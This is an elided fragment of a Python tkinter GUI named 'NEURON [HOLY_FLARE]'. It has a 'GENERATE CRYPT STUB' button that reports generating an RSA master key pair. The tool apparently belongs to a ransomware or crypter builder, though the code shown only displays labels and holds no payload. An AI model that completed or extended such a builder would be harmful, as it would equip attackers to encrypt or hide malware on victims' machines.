...
'''
import Crypto 
# Needs to be pip installed via pycryptodome
...
class App(tk.Tk):
    def __init__(self):
        ...
        # heading
        heading = tk.Label(self, text='NEURON v1.0.1 [HOLY_FLARE]', font=('Helvetica', 13), background='#2e3440', foreground="white")
        ...
        # Gen button
        login_button = tk.Button(self, text="GENERATE CRYPT STUB", font=('Helvetica', 13),activebackground='#4c566a',activeforeground='white', background='#2e3440', foreground="white", command=lambda: self.gen_rsa())
        login_button.grid(column=0, row=3, sticky=tk.N, padx=5, pady=5)


    def gen_rsa(self):
        gen_label = tk.Label(self, background='#2e3440', font=('Helvetica', 13), foreground="white", text="[~] NEURON >> Generating our new master key...")
        ...
        gen2_label = tk.Label(self, background='#2e3440', font=('Helvetica', 13), foreground="white", text="[~] NEURON >> Keys generated, saving to files...")
        gen2_label.grid(column=0, row=5, sticky=tk.W)
        gen3_label = tk.Label(self, background='#2e3440', font=('Helvetica', 13), foreground="white", wraplength=459, text="[~] NEURON >> Done! Your public key is.. 'public.pem'")
        gen3_label.grid(column=0, row=6, sticky=tk.W)
        gen4_label = tk.Label(self, background='#2e3440', font=('Helvetica', 13), foreground="white", wraplength=459, text="[~] NEURON >> Done! Your private key is.. 'private.pem'")
